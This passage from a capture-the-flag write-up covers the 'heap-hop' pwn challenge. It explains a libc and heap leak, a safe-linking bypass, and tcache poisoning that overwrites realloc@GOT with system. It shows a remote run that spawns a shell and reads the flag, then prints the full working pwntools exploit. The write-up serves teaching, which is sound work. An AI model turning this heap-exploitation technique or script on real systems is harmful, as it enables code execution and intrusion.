0x1d83690       0x0000000000000000      0x0000000000000000      ................                             
0x1d836a0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836b0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836c0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836d0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836e0       0x0000000000000000      0x0000000000000000      ................                             
0x1d836f0       0x0000000000000000      0x0000000000000000      ................                             
0x1d83700       0x0000000000000000      0x0000000000000000      ................                             
0x1d83710       0x0000000000000000      0x0000000000000000      ................                             
0x1d83720       0x0000000000000000      0x0000000000000000      ................                             
0x1d83730       0x0000000000000000      0x0000000000000000      ................                             
0x1d83740       0x0000000000000000      0x0000000000000000      ................                             
0x1d83750       0x0000000000000000      0x0000000000000000      ................                             
0x1d83760       0x0000000000000000      0x0000000000000000      ................                             
0x1d83770       0x0000000000000000      0x0000000000000000      ................                             
0x1d83780       0x0000000000000000      0x0000000000000000      ................                             
0x1d83790       0x0000000000000000      0x0000000000000000      ................                             
0x1d837a0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837b0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837c0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837d0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837e0       0x0000000000000000      0x0000000000000000      ................                             
0x1d837f0       0x0000000000000000      0x0000000000000000      ................                             
0x1d83800       0x0000000000000000      0x0000000000000000      ................                             
0x1d83810       0x0000000000000000      0x0000000000000000      ................                             
0x1d83820       0x0000000000000000      0x0000000000000000      ................                             
0x1d83830       0x0000000000000000      0x0000000000000041      ........A.......        &lt;= last small chunk, barreer               
0x1d83840       0x000000000000000a      0x0000000000000000      ................                             
0x1d83850       0x0000000000000000      0x0000000000000000      ................                             
0x1d83860       0x0000000000000020      0x0000000001d83880       ........8......                             
0x1d83870       0x0000000000000000      0x0000000000000031      ........1.......                             
0x1d83880       0x00000000000a3233      0x0000000000000000      32..............                             
0x1d83890       0x0000000000000000      0x0000000000000000      ................                             
0x1d838a0       0x0000000000000000      0x000000000001e761      ........a.......        &lt;-- Top chunk        
</code></pre><p>I advice you to take a look at the heap layout if you do not understand the exploit script.</p>
<h3 id="heap-leak">Heap leak</h3>
<p>Now we got a libc leak we&rsquo;re looking for a heap leak, it is basically the same thing as above, but instead of freeing a large chunk, we free a small <code>0x20</code> sized chunk. To understand the defeat of safe-linking I advice you to read <a href="https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation">this</a>. Which gives:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4"># leak heap to craft pointers</span>
edit(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">0x10</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;osef&#34;</span>) <span style="color:#6272a4"># split unsortedbin chunk</span>
free(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4"># tcache 0x20</span>

read(<span style="color:#bd93f9">11</span>) <span style="color:#6272a4"># oob read</span>
io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">0x70</span>)
heap <span style="color:#ff79c6">=</span> (pwn<span style="color:#ff79c6">.</span>unpack(io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">8</span>)) <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">12</span>) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x2000</span> <span style="color:#6272a4"># leak fp of 1</span>
pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;heap: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(heap)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
</code></pre></div><h2 id="tcache-poisoning">tcache poisoning</h2>
<p>To achieve tcache poisoning we just need to get the <code>0x20</code> sized chunk right after the out of bound chunk. Then we free it and we use the out of bound chunk to overwrite the forward pointer of the victim chunk to <code>&amp;realloc@GOT</code>. Given we leaked the heap we can easily bypass the safe-linking protection.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4">#== tcache poisoning</span>

<span style="color:#6272a4"># get the 0x20 sized chunk that is right after the oob chunk</span>
edit(<span style="color:#bd93f9">10</span>, <span style="color:#bd93f9">10</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;osef&#34;</span>)

free(<span style="color:#bd93f9">0</span>)

<span style="color:#6272a4"># tcache 0x20, count = 2, tcache poisoning is basically 10-&gt;fp = target</span>
free(<span style="color:#bd93f9">10</span>) 

<span style="color:#6272a4"># oob write to set 10-&gt;fp = &amp;realloc@got-8 (due to alignment issues)</span>
edit(<span style="color:#bd93f9">11</span>, <span style="color:#bd93f9">0x20</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Y&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x60</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x31</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(((heap <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x21f0</span>) <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">12</span>) <span style="color:#ff79c6">^</span> (exe<span style="color:#ff79c6">.</span>got<span style="color:#ff79c6">.</span>realloc <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">8</span>))) 

edit(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">10</span>, pwn<span style="color:#ff79c6">.</span>p64(libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">+</span> one_gadget(<span style="color:#f1fa8c">&#34;./libc.so.6&#34;</span>)[<span style="color:#bd93f9">0</span>])) <span style="color:#6272a4"># useless</span>
edit(<span style="color:#bd93f9">12</span>, <span style="color:#bd93f9">10</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\0</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 12 =&gt; b&#34;/binb/sh\0&#34;</span>

<span style="color:#6272a4"># given we falls on &amp;realloc@got-8, we overwrite got entries correctly </span>
edit(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">10</span>, pwn<span style="color:#ff79c6">.</span>p64(libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>malloc) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>system) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>scanf))
</code></pre></div><h2 id="profit">PROFIT</h2>
<p>Then we just have to do:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4"># edit =&gt; realloc(&#34;/bin/sh&#34;) =&gt; system(&#34;/bin/sh&#34;)</span>
io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;3&#34;</span>)
io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#bd93f9">12</span>)<span style="color:#ff79c6">.</span>encode())
io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#bd93f9">10</span>)<span style="color:#ff79c6">.</span>encode())

io<span style="color:#ff79c6">.</span>interactive()
</code></pre></div><p>Which gives:</p>
<pre tabindex="0"><code>nasm@off:~/Documents/pwn/pwnme/heap$ python3 exploit.py REMOTE HOST=51.254.39.184 PORT=1336
[*] '/home/nasm/Documents/pwn/pwnme/heap/heap-hop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'/home/nasm/Documents/pwn/pwnme/heap'
[*] '/home/nasm/Documents/pwn/pwnme/heap/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/nasm/Documents/pwn/pwnme/heap/ld-linux-x86-64.so.2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 51.254.39.184 on port 1336: Done
[*] libc: 0x7faf9a27f000
[*] heap: 0x191d000
[*] one_gadget: 0x7faf9a36acf8 @ 0x404050
[*] Switching to interactive mode
$ id
uid=1000(player) gid=999(ctf) groups=999(ctf)
$ ls
flag.txt
run
$ cat flag.txt
PWNME{d1d_y0u_kn0w_r341l0c_c4n_b3h4v3_l1k3_th4t}
</code></pre><h2 id="final-exploit">Final exploit</h2>
<p>Here is the final exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#6272a4"># -*- coding: utf-8 -*-</span>

<span style="color:#6272a4"># this exploit was generated via</span>
<span style="color:#6272a4"># 1) pwntools</span>
<span style="color:#6272a4"># 2) ctfmate</span>

<span style="color:#ff79c6">import</span> os
<span style="color:#ff79c6">import</span> time
<span style="color:#ff79c6">import</span> pwn

BINARY <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;heap-hop&#34;</span>
LIBC <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/home/nasm/Documents/pwn/pwnme/heap/libc.so.6&#34;</span>
LD <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/home/nasm/Documents/pwn/pwnme/heap/ld-linux-x86-64.so.2&#34;</span>

<span style="color:#6272a4"># Set up pwntools for the correct architecture</span>
exe <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(BINARY)
libc <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(LIBC)
ld <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(LD)
pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>terminal <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#34;tmux&#34;</span>, <span style="color:#f1fa8c">&#34;splitw&#34;</span>, <span style="color:#f1fa8c">&#34;-h&#34;</span>]
pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>delete_corefiles <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>
pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>rename_corefiles <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">False</span>
p64 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p64
u64 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64
p32 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p32
u32 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u32
p16 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p16
u16 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u16
p8  <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p8
u8  <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u8

host <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>HOST <span style="color:#ff79c6">or</span> <span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>
port <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>PORT <span style="color:#ff79c6">or</span> <span style="color:#bd93f9">1337</span>)


<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">local</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
    <span style="color:#f1fa8c">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>debug([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, gdbscript<span style="color:#ff79c6">=</span>gdbscript, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
    <span style="color:#ff79c6">else</span>:
        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>process([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)


<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">remote</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
    <span style="color:#f1fa8c">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    io <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>connect(host, port)
    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
        pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>attach(io, gdbscript<span style="color:#ff79c6">=</span>gdbscript)
    <span style="color:#ff79c6">return</span> io


<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">start</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
    <span style="color:#f1fa8c">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>LOCAL:
        <span style="color:#ff79c6">return</span> local(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
    <span style="color:#ff79c6">else</span>:
        <span style="color:#ff79c6">return</span> remote(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)

<span style="color:#ff79c6">import</span> subprocess
<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">one_gadget</span>(filename):
  <span style="color:#ff79c6">return</span> [<span style="color:#8be9fd;font-style:italic">int</span>(i) <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> subprocess<span style="color:#ff79c6">.</span>check_output([<span style="color:#f1fa8c">&#39;one_gadget&#39;</span>, <span style="color:#f1fa8c">&#39;--raw&#39;</span>, filename])<span style="color:#ff79c6">.</span>decode()<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; &#39;</span>)]

gdbscript <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;&#39;
</span><span style="color:#f1fa8c">source ~/Downloads/pwndbg/gdbinit.py
</span><span style="color:#f1fa8c">&#39;&#39;&#39;</span><span style="color:#ff79c6">.</span>format(<span style="color:#ff79c6">**</span><span style="color:#8be9fd;font-style:italic">locals</span>())

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">exp</span>():

    io <span style="color:#ff79c6">=</span> start()

    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">create</span>(idx, name, trackLen, trackContent):
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;1&#34;</span>)
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, name)
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(trackLen)<span style="color:#ff79c6">.</span>encode())
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(trackLen)<span style="color:#ff79c6">.</span>encode())

    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">read</span>(idx):
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;2&#34;</span>)
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
        io<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;[+] track content :</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)

    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">edit</span>(idx, newLength, trackContent):
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;3&#34;</span>)
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(newLength)<span style="color:#ff79c6">.</span>encode())
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, trackContent)

    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">free</span>(idx):
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;3&#34;</span>)
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">.</span>encode())
        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>)

    create(<span style="color:#bd93f9">0</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, <span style="color:#bd93f9">5</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;0&#34;</span>)
    
    <span style="color:#6272a4"># Step one, 7 chunks to fill tcache later</span>
    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">7</span>):
        create(<span style="color:#bd93f9">1</span><span style="color:#ff79c6">+</span>i, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, <span style="color:#bd93f9">0x400</span>, <span style="color:#8be9fd;font-style:italic">str</span>(i)<span style="color:#ff79c6">.</span>encode())

    <span style="color:#6272a4"># small chunk which will be used to the oob r/w</span>
    create(<span style="color:#bd93f9">8</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, <span style="color:#bd93f9">0x20</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;_&#34;</span>)
    <span style="color:#6272a4"># victim chunk</span>
    create(<span style="color:#bd93f9">9</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, <span style="color:#bd93f9">0x400</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;_&#34;</span>)

    <span style="color:#6272a4"># chunk with big size that will be used for the oob r/w</span>
    create(<span style="color:#bd93f9">10</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, <span style="color:#bd93f9">0x200</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;barreer&#34;</span>)
    create(<span style="color:#bd93f9">10</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">2</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, <span style="color:#bd93f9">0x20</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;barree2&#34;</span>)

    <span style="color:#6272a4"># fill tcache</span>
    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">7</span>):
        free(<span style="color:#bd93f9">1</span><span style="color:#ff79c6">+</span>i)

    <span style="color:#6272a4"># oob chunk </span>
    free(<span style="color:#bd93f9">8</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>)
    
    free(<span style="color:#bd93f9">11</span>)
    edit(<span style="color:#bd93f9">11</span>, <span style="color:#bd93f9">0x20</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;_&#34;</span>) <span style="color:#6272a4"># allocated in 9</span>
    
    free(<span style="color:#bd93f9">9</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>) <span style="color:#6272a4"># falls in the unsortedbin</span>

    read(<span style="color:#bd93f9">11</span>) <span style="color:#6272a4"># oob read</span>
    io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">0x70</span>)
    libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>unpack(io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">8</span>)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x219ce0</span>
    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;libc: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc<span style="color:#ff79c6">.</span>address)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># leak libc</span>

    <span style="color:#6272a4"># leak heap to craft pointers</span>
    edit(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">0x10</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;osef&#34;</span>) <span style="color:#6272a4"># split unsortedbin chunk</span>
    free(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4"># tcache 0x20</span>

    read(<span style="color:#bd93f9">11</span>) <span style="color:#6272a4"># oob read</span>
    io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">0x70</span>)
    heap <span style="color:#ff79c6">=</span> (pwn<span style="color:#ff79c6">.</span>unpack(io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">8</span>)) <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">12</span>) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x2000</span>
    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;heap: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(heap)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)

    <span style="color:#6272a4">#== tcache poisoning</span>
 
    <span style="color:#6272a4"># get the 0x20 sized chunk that is right after the oob chunk</span>
    edit(<span style="color:#bd93f9">10</span>, <span style="color:#bd93f9">10</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;osef&#34;</span>)

    free(<span style="color:#bd93f9">0</span>)

    <span style="color:#6272a4"># tcache 0x20, count = 2, tcache poisoning is basically 10-&gt;fp = target</span>
    free(<span style="color:#bd93f9">10</span>) 

    <span style="color:#6272a4"># oob write to set 10-&gt;fp = &amp;realloc@got-8 (due to alignment issues)</span>
    edit(<span style="color:#bd93f9">11</span>, <span style="color:#bd93f9">0x20</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Y&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x60</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x31</span>) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(((heap <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x21f0</span>) <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">12</span>) <span style="color:#ff79c6">^</span> (exe<span style="color:#ff79c6">.</span>got<span style="color:#ff79c6">.</span>realloc <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">8</span>))) 

    edit(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">10</span>, pwn<span style="color:#ff79c6">.</span>p64(libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">+</span> one_gadget(<span style="color:#f1fa8c">&#34;./libc.so.6&#34;</span>)[<span style="color:#bd93f9">0</span>])) <span style="color:#6272a4"># useless</span>
    edit(<span style="color:#bd93f9">12</span>, <span style="color:#bd93f9">10</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\0</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 12 =&gt; b&#34;/binb/sh\0&#34;</span>

    <span style="color:#6272a4"># given we falls on &amp;realloc@got-8, we overwrite got entries correctly </span>
    edit(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">10</span>, pwn<span style="color:#ff79c6">.</span>p64(libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>malloc) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>system) <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p64(libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>scanf))


    <span style="color:#6272a4"># edit =&gt; realloc(&#34;/bin/sh&#34;) =&gt; system(&#34;/bin/sh&#34;)</span>
    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;3&#34;</span>)
    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#bd93f9">12</span>)<span style="color:#ff79c6">.</span>encode())
    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#bd93f9">10</span>)<span style="color:#ff79c6">.</span>encode())

    io<span style="color:#ff79c6">.</span>interactive()

<span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
    exp()
</code></pre></div>
    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
